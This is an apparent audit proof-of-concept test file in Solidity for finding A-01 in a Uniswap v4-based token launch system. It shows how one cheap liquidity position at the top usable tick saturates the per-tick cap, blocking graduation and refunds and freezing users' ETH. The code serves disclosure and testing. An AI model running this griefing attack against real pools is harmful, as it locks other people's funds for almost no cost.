// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Pool} from "@uniswap/v4-core/src/libraries/Pool.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {AuditABase} from "./AuditABase.sol";
import {Swapper} from "../../utils/PoolBase.sol";
import {SweepVault} from "../../../src/SweepVault.sol";
import {FrogCurve} from "../../../src/curve/FrogCurve.sol";
import {CurveToken} from "../../../src/curve/CurveToken.sol";
import {FloorModule} from "../../../src/floor/FloorModule.sol";

/// A-01: Uniswap v4 caps the gross liquidity referencing any one tick (`maxLiquidityPerTick`). The lock's layers always include
/// a FULL-RANGE position whose bounds are the fixed, public `minUsableTick`/`maxUsableTick`. Liquidity at those extreme ticks is
/// almost free (a position one spacing wide just under the max tick is ETH-only and needs ~1e12 wei for the WHOLE per-tick cap),
/// so anyone can fill the cap at that tick; every later full-range add of the lock then reverts `TickLiquidityOverflow`.
contract TickSaturationTest is AuditABase {
    using StateLibrary for IPoolManager;

    Swapper attacker;

    function setUp() public override {
        super.setUp();
        attacker = new Swapper(PM);
        vm.deal(address(attacker), 1 ether);
    }

    function _sqrtAtCap() internal pure returns (uint160) {
        return uint160(Math.sqrt(Math.mulDiv(1e18, 2 ** 192, CAP)));
    }

    /// The attack on the collection's SHARED ETH/wX pool: one ETH-only position at the top usable tick, max per-tick liquidity.
    function _saturateShared() internal returns (uint256 cost) {
        PoolKey memory key = lock.sharedKey();
        (uint160 s,,,) = PM.getSlot0(key.toId());
        if (s == 0) PM.initialize(key, _sqrtAtCap());          // permissionless; at the keeper's price so nothing looks off
        int24 maxT = TickMath.maxUsableTick(key.tickSpacing);
        uint128 lmax = Pool.tickSpacingToMaxLiquidityPerTick(key.tickSpacing);
        uint256 b0 = address(attacker).balance;
        attacker.addLiquidity(key, maxT - key.tickSpacing, maxT, lmax);
        cost = b0 - address(attacker).balance;
    }

    function test_A01_sharedPoolSaturation_freezesEveryGraduation() public {
        uint256 cost = _saturateShared();
        emit log_named_uint("attacker's cost, wei of ETH", cost);
        assertLt(cost, 1e13, "a fraction of a cent");

        // an ordinary coin on the frog collection sells out; the module converts its item budget at once (the Phase-1 path)
        (FrogCurve c, CurveToken tok) = _launch(SweepVault.Policy.RAFFLE, false);
        _skipBoth(20 minutes);                                  // past the launch fee
        _fillCurve(c);
        assertEq(uint8(c.state()), uint8(FrogCurve.State.Graduating));
        assertTrue(module.isFilled(address(tok)), "filled at enqueue");

        // graduation now reverts inside the lock's full-range shared add
        int24 maxT = TickMath.maxUsableTick(60);
        vm.expectRevert(abi.encodeWithSelector(Pool.TickLiquidityOverflow.selector, maxT));
        c.graduate();

        // and the refund exit is closed because the module already filled it
        _skipBoth(3 days + 1 hours);
        _postCap(curveRaffle, CAP);
        _floor(CAP);
        vm.expectRevert(abi.encodeWithSelector(Pool.TickLiquidityOverflow.selector, maxT));
        c.graduate();
        vm.expectRevert(FrogCurve.WrongState.selector);
        c.openRefunds();

        emit log_named_decimal_uint("ETH frozen in the curve", address(c).balance, 18);
        emit log_named_decimal_uint("item budget frozen as module backing (gradEth converted)", module.grad(address(tok)).eth, 18);
        emit log_named_decimal_uint("wX units held for the curve, never released", module.gradUnits(), 18);
        assertGt(address(c).balance, 1 ether);
        assertEq(uint8(module.grad(address(tok)).status), uint8(FloorModule.GradStatus.Filled));

        // holders can neither sell to the curve nor refund
        vm.startPrank(buyer);
        tok.approve(address(c), type(uint256).max);
        vm.expectRevert(FrogCurve.WrongState.selector);
        c.sell(1e18, 0);
        vm.expectRevert(FrogCurve.WrongState.selector);
        c.refund(1e18);
        vm.stopPrank();
    }

    /// One position blocks the whole collection: a second coin launched later is frozen the same way.
    function test_A01_onePositionBlocksEveryLaterCoin() public {
        _saturateShared();
        for (uint256 i = 0; i < 2; ++i) {
            (FrogCurve c,) = _launch(SweepVault.Policy.BURN, false);
            _skipBoth(20 minutes);
            _postCap(curveRaffle, CAP);
            _floor(CAP);
            _fillCurve(c);
            vm.expectRevert();
            c.graduate();
        }
    }

    /// Control: without the attacker's position the same graduation succeeds.
    function test_A01_control_graduatesWithoutTheAttack() public {
        (FrogCurve c,) = _launch(SweepVault.Policy.RAFFLE, false);
        _skipBoth(20 minutes);
        _fillCurve(c);
        c.graduate();
        assertEq(uint8(c.state()), uint8(FrogCurve.State.Graduated));
    }

    /// A SWEEP_ONLY coin's own COIN/ETH pool, attacked the same way before it graduates: there is no refund path at all for
    /// SWEEP_ONLY (`openRefunds` refuses it), so the whole raise is frozen.
    function test_A01_sweepOnlyCoinPoolSaturation_freezesTheRaise() public {
        (FrogCurve c, CurveToken tok) = _launch(SweepVault.Policy.RAFFLE, true);
        // deterministic from the coin's address and fee, known at launch. NB `lock.coinKey(coin)` returns the COIN/wX key until the
        // coin is seeded (it reads `coins[coin].quoteIsEth`, still false), so the attacker builds the COIN/ETH key itself.
        PoolKey memory key = PoolKey(Currency.wrap(address(0)), Currency.wrap(address(tok)), uint24(c.feeBps() * 100), 200,
            IHooks(address(0)));
        assertTrue(Currency.unwrap(lock.coinKey(address(tok)).currency0) != address(0)
            && Currency.unwrap(lock.coinKey(address(tok)).currency1) != address(0), "coinKey names the wX pool pre-seed");
        PM.initialize(key, TickMath.getSqrtPriceAtTick(0));
        int24 maxT = TickMath.maxUsableTick(key.tickSpacing);
        uint128 lmax = Pool.tickSpacingToMaxLiquidityPerTick(key.tickSpacing);
        uint256 b0 = address(attacker).balance;
        attacker.addLiquidity(key, maxT - key.tickSpacing, maxT, lmax);   // ETH (currency0) only
        emit log_named_uint("attacker's cost, wei of ETH", b0 - address(attacker).balance);

        _skipBoth(20 minutes);
        _fillCurve(c);
        vm.expectRevert(abi.encodeWithSelector(Pool.TickLiquidityOverflow.selector, maxT));
        c.graduate();
        _skipBoth(3 days + 1 hours);
        vm.expectRevert(FrogCurve.WrongState.selector);
        c.openRefunds();
        emit log_named_decimal_uint("ETH frozen in the SWEEP_ONLY curve", address(c).balance, 18);
        assertGt(address(c).balance, 4 ether);
    }
}
